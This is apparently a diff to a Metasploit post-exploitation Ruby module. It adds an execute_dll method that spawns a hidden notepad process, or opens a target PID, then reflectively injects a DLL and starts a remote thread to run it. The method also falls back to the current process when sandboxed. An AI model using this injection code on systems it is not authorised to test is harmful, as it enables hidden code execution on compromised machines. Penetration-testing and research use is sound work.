@@ -9,7 +9,7 @@ module Process
 
   include Msf::Post::Windows::ReflectiveDLLInjection
 
-  # Checks the Architeture of a Payload and PID are compatible
+  # Checks the architecture of a payload and PID are compatible
   # Returns true if they are false if they are not
   def arch_check(test_arch, pid)
     # get the pid arch
@@ -35,12 +35,46 @@ module Process
     return cmd
   end
 
+  def execute_dll(rdll_path, param=nil, pid=nil)
+    if pid.nil?
+      print_status('Launching notepad to host the DLL...')
+      notepad_process = client.sys.process.execute('notepad.exe', nil, { 'Hidden' => true })
+      begin
+        process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
+        print_good("Process #{process.pid} launched.")
+      rescue Rex::Post::Meterpreter::RequestError
+        # Reader Sandbox won't allow to create a new process:
+        # stdapi_sys_process_execute: Operation failed: Access is denied.
+        print_error('Operation failed. Trying to inject into the current process...')
+        process = client.sys.process.open
+      end
+    else
+      process = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
+    end
+
+    print_status("Reflectively injecting the DLL into #{process.pid}...")
+    exploit_mem, offset = inject_dll_into_process(process, ::File.expand_path(rdll_path))
+
+    if param.is_a?(String)
+      # if it's a string, treat it as data and copy it into the remote process then pass it by reference
+      param_ptr = inject_into_process(process, param)
+    elsif param.is_a?(Integer)
+      param_ptr = param
+    elsif param.nil?
+      param_ptr = 0
+    else
+      raise TypeError, 'param must be a string, integer or nil'
+    end
+
+    process.thread.create(exploit_mem + offset, param_ptr)
+  end
+
   #
   # Injects shellcode to a process, and executes it.
   #
   # @param shellcode [String] The shellcode to execute
   # @param base_addr [Integer] The base address to allocate memory
-  # @param pid       [Integer] The process ID to inject to
+  # @param pid       [Integer] The process ID to inject to, if unspecified, the shellcode will be executed in place.
   #
   # @return [Boolean] True if successful, otherwise false
   #
